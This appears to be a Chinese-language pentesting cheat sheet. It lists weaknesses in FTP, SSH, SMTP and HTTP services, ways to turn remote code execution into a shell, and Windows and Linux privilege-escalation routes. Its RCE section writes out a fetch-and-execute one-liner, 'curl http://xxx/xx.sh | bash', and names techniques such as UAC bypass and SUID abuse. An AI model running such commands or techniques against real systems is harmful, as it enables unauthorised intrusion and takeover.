1.常用的网络服务

1.FTP 默认端口：21

  • 匿名访问：anonymous
  • 弱凭证
  • 包含敏感文件
  • 可写入文件
  • CVE（RCE，目录遍历等）

登录：

2.SSH 默认端口：22

  • 弱凭证
  • 私钥泄露

打开SSH服务

登录：

user：远程机器上的用户名，若不指定，默认为当前用户

remote：远程机器的地址，可以是ip，域名

port：指定ssh server监听的端口，若不指定，则默认为22端口

3.SMTP 默认端口：25

  • 内部钓鱼
  • 枚举用户

4.HTTP/HTTPS

  • 子域名、虚拟主机枚举
  • 源代码注释
  • 报错信息
  • 框架、中间件、应用的CVE

Windows

6.RCE到shell

1.常见限制

  • 无法看到输出
  • 注入代码的长度受限
  • 安全控制措施
  • 防火墙 （你的4444端口被拦截→_→）
  • 限制性shell环境（rshell）

2.解决措施

  • 编码命令

  • 将命令存储在文本文件里

    例如将命令存在http://xxx/xx.sh内，然后用更短的命令执行：curl http://xxx/xx.sh | bash

  • 内存中执行代码

  • OOB手段得到输出

    例如whoami > xx.txt 再查看xx.txt

  • 逆向到特定端口

7.提权

Windows

  • CVE
  • AlwaysInstallElevated 安装msi包的时候以管理员特权执行
  • 脆弱的服务（二进制文件、服务、没有引号的路径）
  • UAC绕过（UAC绕过技术一、UAC绕过技术二、UAC绕过初探）
  • DLL劫持
  • 配置不当的Privilege，

Linux

  • CVE
  • sudo list
  • SUID
  • Capability
  • 可写passwd或shadow
  • 环境变量利用
